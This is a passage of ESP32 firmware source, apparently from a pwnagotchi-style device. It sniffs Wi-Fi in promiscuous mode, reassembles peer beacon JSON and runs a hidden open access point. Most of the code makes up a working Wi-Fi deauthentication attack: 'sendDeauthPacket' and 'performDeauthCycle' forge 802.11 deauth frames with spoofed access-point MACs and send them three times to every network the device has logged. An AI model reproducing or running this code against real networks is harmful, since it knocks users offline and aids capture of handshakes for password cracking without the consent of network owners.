                  Serial.println("Packet reassembly timeout, discarding");
                  fullPacket = "";
                  return;
              }
              // Continuation of existing JSON
              fullPacket.concat(packet);
              if (packet.length() > 0 && packet[packet.length() - 1] == '}') {
                  //Serial.println("Complete JSON: " + fullPacket);
                  
                  const size_t DOC_SIZE = 4096;
                  DynamicJsonDocument sniffed_json(DOC_SIZE);
                  DeserializationError result = deserializeJson(sniffed_json, fullPacket.c_str());
                  if (result == DeserializationError::Ok) {
                      sniffed_json["rssi"] = snifferPacket->rx_ctrl.rssi;
                      sniffed_json["channel"] = snifferPacket->rx_ctrl.channel;
                      pwngridAddPeer(sniffed_json, snifferPacket->rx_ctrl.rssi, snifferPacket->rx_ctrl.channel);
                  } else {
                      Serial.print("JSON parse error: ");
                      Serial.println(result.c_str());
                  }
                  fullPacket = "";
              }
          } //next IE
          i += 2 + ie_len;
        } // end IE scan
      }
    }
  //Serial.println("pwnSnifferCallback done.");
  }
}

const wifi_promiscuous_filter_t filter = {
  .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
};

inline uint8_t readWifiChannel() {
    uint8_t primary = 1;
    wifi_second_chan_t second;
    esp_wifi_get_channel(&primary, &second);
    return primary;
}

void initPwning() {
  int rc;

  Serial.println("Init Pwning processes");
  env.reset();
  loadStats();
  initDB();
  initDBWorkers();

  try {
    GPS.setSerialPtr(Serial1);
    GPS.start();
    hasGPS = true;
    Serial.println("GPS initialised succesfully.");
  } catch (...) {
      Serial.println("Error initialising GPS");
      hasGPS = false;
  }

  auto id = ensurePwnIdentity(true);
  //Serial.println("Identity: " + id.name + " - short_id: " + id.short_id + " pub_hex: " + id.pub_hex );
  setDeviceName(id.name.c_str());
  // Disable WiFi logging
  esp_log_level_set("wifi", ESP_LOG_NONE);

  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_APSTA);

  esp_wifi_set_promiscuous_filter(&filter);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&pwnSnifferCallback);

  // ---- initialize AP interface (stealth) ----
  wifi_config_t ap_cfg = {0};
  ap_cfg.ap.ssid_len = 0;
  ap_cfg.ap.channel = 6;
  ap_cfg.ap.authmode = WIFI_AUTH_OPEN;
  ap_cfg.ap.max_connection = 0;

  esp_wifi_set_config(WIFI_IF_AP, &ap_cfg);

  esp_wifi_start();

  // esp_wifi_set_ps(WIFI_PS_NONE);
  esp_wifi_set_channel(random(0, 14), WIFI_SECOND_CHAN_NONE);
  delay(1);
  Serial.println("Pwngrid initialised.");
}

esp_err_t sendRawFrame(wifi_interface_t ifx, const void *frame, int len, const char *tag) {
    esp_err_t err;

    // First try esp_wifi_internal_tx ONLY if not in promiscuous mode
    wifi_mode_t mode;
    esp_wifi_get_mode(&mode);

    if (mode == WIFI_MODE_STA || mode == WIFI_MODE_AP || mode == WIFI_MODE_APSTA) {
        err = esp_wifi_internal_tx(ifx, frame, len);
        if (err != ESP_OK) {
            Serial.println("internal_tx failed, falling back to 80211_tx");
            goto fallback;
        }
        return ESP_OK;
    }

fallback:
    err = esp_wifi_80211_tx(ifx, frame, len, false);
    if (err != ESP_OK) {
        Serial.printf("80211_tx failed: %d\n", err);
    }
    return err;
}


void sendDeauthPacket(const uint8_t* bssid, const uint8_t* sta)
{
  struct
  {
    uint8_t frame_control[2];
    uint8_t duration[2];
    uint8_t addr1[6];
    uint8_t addr2[6];
    uint8_t addr3[6];
    uint8_t sequence_control[2];
    uint8_t reason_code[2];
  } __attribute__((packed)) deauth_frame;

  deauth_frame.frame_control[0] = 0xC0;  // To DS + From DS + Deauth Frame
  deauth_frame.frame_control[1] = 0x00;
  deauth_frame.duration[0] = 0x00;
  deauth_frame.duration[1] = 0x00;
  memcpy(deauth_frame.addr1, sta, 6);    // STA address
  memcpy(deauth_frame.addr2, bssid, 6);  // AP address
  memcpy(deauth_frame.addr3, bssid, 6);  // AP address
  deauth_frame.sequence_control[0] = 0x00;
  deauth_frame.sequence_control[1] = 0x00;
  deauth_frame.reason_code[0] = 0x01;  // Reason: Unspecified reason
  deauth_frame.reason_code[1] = 0x00;

  esp_wifi_80211_tx(WIFI_IF_AP, (uint8_t*)&deauth_frame, sizeof(deauth_frame), true);
}

void performDeauthCycle() {
    Serial.println("Performing deauth");
    std::vector<BeaconEntry> snapshot;
    snapshot.reserve(gRegisteredBeacons.size());
    portENTER_CRITICAL(&gRadioMux);
    std::copy(gRegisteredBeacons.begin(), gRegisteredBeacons.end(), std::back_inserter(snapshot));
    portEXIT_CRITICAL(&gRadioMux);

    if (snapshot.empty()) { 
      Serial.println("Snapshot empty, returning");
      return; 
    }

    uint8_t originalChannel = readWifiChannel();

    for (const auto &entry : snapshot) {
        if (entry.channel != originalChannel) { continue; }
        uint8_t frame[sizeof(kDeauthFrameTemplate)];
        memcpy(frame, kDeauthFrameTemplate, sizeof(kDeauthFrameTemplate));
        memcpy(frame + 10, entry.mac, 6);
        memcpy(frame + 16, entry.mac, 6);

        esp_wifi_set_channel(entry.channel, WIFI_SECOND_CHAN_NONE);
        Serial.printf("Sending three magic packets to: %02x:%02x:%02x:%02x:%02x:%02x\n", 
            entry.mac[0], entry.mac[1], entry.mac[2], entry.mac[3], entry.mac[4], entry.mac[5]);

        for (int i = 0; i < 3; ++i) {
            esp_err_t err = sendRawFrame(WIFI_IF_AP, frame, sizeof(frame), "Deauth");
            if (err != ESP_OK) {
                Serial.println("Deauth tx failed on STA iface.");
            }
        }
    }

    esp_wifi_set_channel(originalChannel, WIFI_SECOND_CHAN_NONE);
}

Environment &getEnv() {
  return env;
}

